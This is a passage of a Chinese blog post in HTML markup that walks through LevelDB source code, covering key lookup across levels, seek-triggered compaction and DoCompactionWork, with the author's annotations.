class="comment">// Done</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      s = current-&gt;Get(options, lkey, value, &amp;stats);<span class="comment">// 3.再去sstable， ！！注意这里的status</span></span><br><span class="line">      have_stat_update = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_.Lock();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (have_stat_update &amp;&amp; current-&gt;UpdateStats(stats)) &#123; <span class="comment">// 4.这里调用了UpdateStats</span></span><br><span class="line">    MaybeScheduleCompaction();</span><br><span class="line">  &#125;</span><br><span class="line">  mem-&gt;Unref();</span><br><span class="line">  <span class="keyword">if</span> (imm != <span class="literal">nullptr</span>) imm-&gt;Unref();</span><br><span class="line">  current-&gt;Unref();</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==Version::Get==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">Version::Get</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options, <span class="keyword">const</span> LookupKey&amp; k,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="built_in">std</span>::<span class="built_in">string</span>* value, GetStats* stats)</span> </span>&#123;</span><br><span class="line">  stats-&gt;seek_file = <span class="literal">nullptr</span>;</span><br><span class="line">  stats-&gt;seek_file_level = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">State</span> &#123;</span></span><br><span class="line">     ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Match</span><span class="params">(<span class="keyword">void</span>* arg, <span class="keyword">int</span> level, FileMetaData* f)</span> </span>&#123;</span><br><span class="line">      State* state = <span class="keyword">reinterpret_cast</span>&lt;State*&gt;(arg);</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Not reached. Added to avoid false compilation warnings of</span></span><br><span class="line">      <span class="comment">// "control reaches end of non-void function".</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  State state;</span><br><span class="line">  state.found = <span class="literal">false</span>;</span><br><span class="line">   <span class="comment">// ！！stats控制转移到State类</span></span><br><span class="line">  state.stats = stats;</span><br><span class="line">  state.last_file_read = <span class="literal">nullptr</span>;</span><br><span class="line">  state.last_file_read_level = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  ForEachOverlapping(state.saver.user_key, state.ikey, &amp;state, &amp;State::Match);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> state.found ? state.s : Status::NotFound(Slice());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后走到了ForEachOverlapping，参数中传入了一个函数指针, State::Match, 后序在分析。先看ForEachOverlapping:</p><p>==ForEachOverlapping==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Version::ForEachOverlapping</span><span class="params">(Slice user_key, Slice internal_key, <span class="keyword">void</span>* arg,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">bool</span> (*func)(<span class="keyword">void</span>*, <span class="keyword">int</span>, FileMetaData*))</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> Comparator* ucmp = vset_-&gt;icmp_.user_comparator();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Search level-0 in order from newest to oldest.</span></span><br><span class="line">   <span class="comment">// 加入第0层文件</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; tmp;</span><br><span class="line">  tmp.reserve(files_[<span class="number">0</span>].<span class="built_in">size</span>());</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; files_[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    FileMetaData* f = files_[<span class="number">0</span>][i];</span><br><span class="line">    <span class="keyword">if</span> (ucmp-&gt;Compare(user_key, f-&gt;smallest.user_key()) &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">        ucmp-&gt;Compare(user_key, f-&gt;largest.user_key()) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      tmp.push_back(f);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!tmp.empty()) &#123;</span><br><span class="line">      <span class="comment">// 按照新旧排序，由新到旧</span></span><br><span class="line">    <span class="built_in">std</span>::sort(tmp.<span class="built_in">begin</span>(), tmp.<span class="built_in">end</span>(), NewestFirst);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; tmp.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(*func)(arg, <span class="number">0</span>, tmp[i])) &#123;<span class="comment">// 调用State::Match, 由于第0层无序，所以可能需要多次调用</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Search other levels.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">1</span>; level &lt; <span class="built_in">config</span>::kNumLevels; level++) &#123;</span><br><span class="line">    <span class="keyword">size_t</span> num_files = files_[level].<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (num_files == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Binary search to find earliest index whose largest key &gt;= internal_key.</span></span><br><span class="line">    <span class="keyword">uint32_t</span> index = FindFile(vset_-&gt;icmp_, files_[level], internal_key);</span><br><span class="line">    <span class="keyword">if</span> (index &lt; num_files) &#123;</span><br><span class="line">      FileMetaData* f = files_[level][index];</span><br><span class="line">      <span class="keyword">if</span> (ucmp-&gt;Compare(user_key, f-&gt;smallest.user_key()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// All of "f" is past any data for user_key</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;<span class="comment">// 到这里，确定了 internal_key 一定是在 本file的key range中，即overlap</span></span><br><span class="line">        <span class="keyword">if</span> (!(*func)(arg, level, f)) &#123;<span class="comment">// 一个level，只会调用</span></span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ForEachOverlapping函数中，首先搜索level0，在level 0中找到一些sstable，这些sstable的key range包含了user_key. 然后不断调用Match函数，直到找到相应file。 <strong>由于level0的无序性，所以Match函数可能被调用了多次。</strong></p><p>如果level0中找不到能够匹配的SStable，就逐层往下，因为level1–level6都是有序的，<strong>所以每层最多有一个sstable</strong>，满足其key range包含指定user_key， <strong>所以每层只用调用一次Match函数。</strong></p><p>最后，看看：</p><p>==Match==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Match</span><span class="params">(<span class="keyword">void</span>* arg, <span class="keyword">int</span> level, FileMetaData* f)</span> </span>&#123;</span><br><span class="line">    State* state = <span class="keyword">reinterpret_cast</span>&lt;State*&gt;(arg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (state-&gt;stats-&gt;seek_file == <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">        state-&gt;last_file_read != <span class="literal">nullptr</span>) &#123;<span class="comment">// 走到这个分支，说明Match函数至少已经被调用过一次，也就是说至少浪费了一次io</span></span><br><span class="line">        <span class="comment">// We have had more than one seek for this read.  Charge the 1st file.</span></span><br><span class="line">        state-&gt;stats-&gt;seek_file = state-&gt;last_file_read;</span><br><span class="line">        state-&gt;stats-&gt;seek_file_level = state-&gt;last_file_read_level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    state-&gt;last_file_read = f;</span><br><span class="line">    state-&gt;last_file_read_level = level;</span><br><span class="line"></span><br><span class="line">    state-&gt;s = state-&gt;vset-&gt;table_cache_-&gt;Get(*state-&gt;options, f-&gt;number,</span><br><span class="line">                                              f-&gt;file_size, state-&gt;ikey,</span><br><span class="line">                                              &amp;state-&gt;saver, SaveValue);</span><br><span class="line">    <span class="keyword">if</span> (!state-&gt;s.ok()) &#123;</span><br><span class="line">        state-&gt;found = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">// 不再search</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (state-&gt;saver.state) &#123;</span><br><span class="line">        <span class="keyword">case</span> kNotFound:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// Keep searching in other files</span></span><br><span class="line">        <span class="keyword">case</span> kFound:</span><br><span class="line">            state-&gt;found = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 不再search</span></span><br><span class="line">        <span class="keyword">case</span> kDeleted:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 不再search</span></span><br><span class="line">        <span class="keyword">case</span> kCorrupt:</span><br><span class="line">            state-&gt;s =</span><br><span class="line">                Status::Corruption(<span class="string">"corrupted key for "</span>, state-&gt;saver.user_key);</span><br><span class="line">            state-&gt;found = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not reached. Added to avoid false compilation warnings of</span></span><br><span class="line">    <span class="comment">// "control reaches end of non-void function".</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这个函数中也终于可以找到<code>seek_file</code>被赋值的地方：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (state-&gt;stats-&gt;seek_file == <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">    state-&gt;last_file_read != <span class="literal">nullptr</span>) &#123;<span class="comment">// 走到这个分支，说明Match函数至少已经被调用过一次，也就是说至少浪费了一次io</span></span><br><span class="line">    <span class="comment">// We have had more than one seek for this read.  Charge the 1st file.</span></span><br><span class="line">    state-&gt;stats-&gt;seek_file = state-&gt;last_file_read;</span><br><span class="line">    state-&gt;stats-&gt;seek_file_level = state-&gt;last_file_read_level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过要进入这个分析，Match已经至少被执行了一次，所以现在记录的是上一次调用Match函数时所用到的file。这个file被访问了，但是却没有找到正确的key。所以它浪费了io，进而在后序的<code>UpdateStats</code>函数中，它的<strong>allowed_seeks会被–</strong>。</p><p><strong>不过感觉这里记录到第一个浪费了io的sstable，后序可能还会存在浪费io的sstable，可能是因为层别越低，访问频率越高，所以越需要快点将其allowed_seeks减小。</strong></p><p>ok，总结一下，花个流程图。</p><h4 id="seek-compaction的流程图（何时触发，如何触发）"><a href="#seek-compaction的流程图（何时触发，如何触发）" class="headerlink" title="seek_compaction的流程图（何时触发，如何触发）"></a>seek_compaction的流程图（何时触发，如何触发）</h4><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-seek_compaction (2).png" style="zoom:50%;" /><h4 id="3-allowed-seeks–的时机-2-amp-DBIter"><a href="#3-allowed-seeks–的时机-2-amp-DBIter" class="headerlink" title="3.  allowed_seeks–的时机 (2) &amp; DBIter"></a>3.  allowed_seeks–的时机 (2) &amp; DBIter</h4><p>这部分请参考DBIter。</p><h2 id="3-Compaction的执行流程"><a href="#3-Compaction的执行流程" class="headerlink" title="3. Compaction的执行流程"></a>3. Compaction的执行流程</h2><p>选择了要执行的Compaction文件后，剩下的就是执行Compaction：</p><p>==DBImpl::BackgroundCompaction==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Status status;</span><br><span class="line"> <span class="keyword">if</span> (c == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">   <span class="comment">// Nothing to do</span></span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!is_manual &amp;&amp; c-&gt;IsTrivialMove()) &#123;<span class="comment">// trivial move: 下层没有本层的重叠key，修改元数据，移动到下层</span></span><br><span class="line">   <span class="comment">// Move file to next level</span></span><br><span class="line">   assert(c-&gt;num_input_files(<span class="number">0</span>) == <span class="number">1</span>);</span><br><span class="line">   FileMetaData* f = c-&gt;input(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   c-&gt;edit()-&gt;RemoveFile(c-&gt;level(), f-&gt;number);</span><br><span class="line">   c-&gt;edit()-&gt;AddFile(c-&gt;level() + <span class="number">1</span>, f-&gt;number, f-&gt;file_size, f-&gt;smallest,</span><br><span class="line">                      f-&gt;largest);</span><br><span class="line">   status = versions_-&gt;LogAndApply(c-&gt;edit(), &amp;mutex_);</span><br><span class="line">   <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">     RecordBackgroundError(status);</span><br><span class="line">   &#125;</span><br><span class="line">   VersionSet::LevelSummaryStorage tmp;</span><br><span class="line">   Log(options_.info_log, <span class="string">"Moved #%lld to level-%d %lld bytes %s: %s\n"</span>,</span><br><span class="line">       <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(f-&gt;number), c-&gt;level() + <span class="number">1</span>,</span><br><span class="line">       <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(f-&gt;file_size),</span><br><span class="line">       status.ToString().c_str(), versions_-&gt;LevelSummary(&amp;tmp));</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;<span class="comment">// ！！实际compaction的代码</span></span><br><span class="line">   CompactionState* compact = <span class="keyword">new</span> CompactionState(c);</span><br><span class="line">   status = DoCompactionWork(compact);</span><br><span class="line">   <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">     RecordBackgroundError(status);</span><br><span class="line">   &#125;</span><br><span class="line">   CleanupCompaction(compact);</span><br><span class="line">   c-&gt;ReleaseInputs();</span><br><span class="line">   RemoveObsoleteFiles();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">delete</span> c;</span><br></pre></td></tr></table></figure><p>上面的代码说明了：</p><ol><li><p>若没有选择的compaction file，则忽略。</p></li><li><p>IsTrivialMove，若选择的compaction文件，level n没有和level n+1重叠，并且level n的文件没有与过多的祖父level文件重叠，则直接修改元数据（verisonedit）即可，不必compaction。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Compaction::IsTrivialMove</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> VersionSet* vset = input_version_-&gt;vset_;</span><br><span class="line">  <span class="comment">// Avoid a move if there is lots of overlapping grandparent data.</span></span><br><span class="line">  <span class="comment">// Otherwise, the move could create a parent file that will require</span></span><br><span class="line">  <span class="comment">// a very expensive merge later on.</span></span><br><span class="line">  <span class="keyword">return</span> (num_input_files(<span class="number">0</span>) == <span class="number">1</span> &amp;&amp; num_input_files(<span class="number">1</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">          TotalFileSize(grandparents_) &lt;=</span><br><span class="line">              MaxGrandParentOverlapBytes(vset-&gt;options_));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>否则，执行真正的<strong>compaction</strong>。</p></li></ol><h3 id="DoCompactionWork"><a href="#DoCompactionWork" class="headerlink" title="DoCompactionWork"></a>DoCompactionWork</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">Status <span class="title">DBImpl::DoCompactionWork</span><span class="params">(CompactionState* compact)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">  <span class="keyword">if</span> (snapshots_.empty()) &#123;</span><br><span class="line">    compact-&gt;smallest_snapshot = versions_-&gt;LastSequence();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    compact-&gt;smallest_snapshot = snapshots_.oldest()-&gt;sequence_number();</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">// 创建迭代器, 内部同过mergeiterator对本次要compaction的文件做“排序”（没有排序，只不过通过iter依次访问数据，得到的结果就是排序后的结果）</span></span><br><span class="line">  Iterator* input = versions_-&gt;MakeInputIterator(compact-&gt;compaction);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Release mutex while we're actually doing the compaction work</span></span><br><span class="line">  mutex_.Unlock();</span><br><span class="line"></span><br><span class="line">  input-&gt;SeekToFirst();</span><br><span class="line">  Status status;</span><br><span class="line">  ParsedInternalKey ikey;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> current_user_key;</span><br><span class="line">  <span class="keyword">bool</span> has_current_user_key = <span class="literal">false</span>;</span><br><span class="line">  SequenceNumber last_sequence_for_key = kMaxSequenceNumber;</span><br><span class="line">  <span class="keyword">while</span> (input-&gt;Valid() &amp;&amp; !shutting_down_.load(<span class="built_in">std</span>::memory_order_acquire)) &#123;</span><br><span class="line">    <span class="comment">// Prioritize immutable compaction work</span></span><br><span class="line">     <span class="comment">// 首先做immtable的dump</span></span><br><span class="line">    <span class="keyword">if</span> (has_imm_.load(<span class="built_in">std</span>::memory_order_relaxed)) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint64_t</span> imm_start = env_-&gt;NowMicros();</span><br><span class="line">      mutex_.Lock();</span><br><span class="line">      <span class="keyword">if</span> (imm_ != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        CompactMemTable();</span><br><span class="line">        <span class="comment">// Wake up MakeRoomForWrite() if necessary.</span></span><br><span class="line">        background_work_finished_signal_.SignalAll();</span><br><span class="line">      &#125;</span><br><span class="line">      mutex_.Unlock();</span><br><span class="line">      imm_micros += (env_-&gt;NowMicros() - imm_start);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Slice key = input-&gt;key();</span><br><span class="line">    <span class="keyword">if</span> (compact-&gt;compaction-&gt;ShouldStopBefore(key) &amp;&amp;</span><br><span class="line">        compact-&gt;builder != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="comment">//检查当前输出文件是否与level+2层文件有过多冲突，如果是就要完成当前输出文件,并产生新的输出文件</span></span><br><span class="line">      status = FinishCompactionOutputFile(compact, input);</span><br><span class="line">      <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面这里是关键！！</span></span><br><span class="line">    <span class="comment">// Handle key/value, add to state, etc.</span></span><br><span class="line">    <span class="keyword">bool</span> drop = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ParseInternalKey(key, &amp;ikey)) &#123;</span><br><span class="line">      <span class="comment">// Do not hide error keys</span></span><br><span class="line">      current_user_key.<span class="built_in">clear</span>();</span><br><span class="line">      has_current_user_key = <span class="literal">false</span>;</span><br><span class="line">      last_sequence_for_key = kMaxSequenceNumber;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 正常情况下走这里</span></span><br><span class="line">      <span class="keyword">if</span> (!has_current_user_key ||<span class="comment">// 已经有了user_key?</span></span><br><span class="line">          user_comparator()-&gt;Compare(ikey.user_key, Slice(current_user_key)) !=</span><br><span class="line">              <span class="number">0</span>) &#123;<span class="comment">// 要分析的user_key是否和之前的user_key相同？</span></span><br><span class="line">        <span class="comment">// First occurrence of this user key</span></span><br><span class="line">        current_user_key.assign(ikey.user_key.data(), ikey.user_key.<span class="built_in">size</span>());</span><br><span class="line">        has_current_user_key = <span class="literal">true</span>;</span><br><span class="line">          <span class="comment">// 第一次出现的user_key不允许删除</span></span><br><span class="line">        last_sequence_for_key = kMaxSequenceNumber;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_sequence_for_key &lt;= compact-&gt;smallest_snapshot) &#123;<span class="comment">//进入这个判断，一定时是出现了重复key. 如果前一个序列号都已经比当前smallest_snapshot小了， 现在key的序列号肯定更小，也肯定小于smallest_snapshot，所以直接drop</span></span><br><span class="line">        <span class="comment">// Hidden by an newer entry for same user key</span></span><br><span class="line">        drop = <span class="literal">true</span>;  <span class="comment">// (A)</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ikey.type == kTypeDeletion &amp;&amp;</span><br><span class="line">                 ikey.sequence &lt;= compact-&gt;smallest_snapshot &amp;&amp;</span><br><span class="line">                 compact-&gt;compaction-&gt;IsBaseLevelForKey(ikey.user_key)) &#123;</span><br><span class="line">      <span class="comment">// 前一个key的序列号时大于smallest_snapshot，而当前key的序列号小于smallest_snapshot,说名当前key是距离smallest_snapshot最近的key，</span></span><br><span class="line">          <span class="comment">// !!!!!! 待完善</span></span><br><span class="line">          <span class="comment">// For this user key:</span></span><br><span class="line">        <span class="comment">// (1) there is no data in higher levels</span></span><br><span class="line">        <span class="comment">// (2) data in lower levels will have larger sequence numbers</span></span><br><span class="line">        <span class="comment">// (3) data in layers that are being compacted here and have</span></span><br><span class="line">        <span class="comment">//     smaller sequence numbers will be dropped in the next</span></span><br><span class="line">        <span class="comment">//     few iterations of this loop (by rule (A) above).</span></span><br><span class="line">        <span class="comment">// Therefore this deletion marker is obsolete and can be dropped.</span></span><br><span class="line">        drop = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      last_sequence_for_key = ikey.sequence;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> (!drop) &#123;<span class="comment">// 不需要删除，则写入到文件</span></span><br><span class="line">      <span class="comment">// Open output file if necessary</span></span><br><span class="line">      <span class="keyword">if</span> (compact-&gt;builder == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        status = OpenCompactionOutputFile(compact);</span><br><span class="line">        <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">          <span 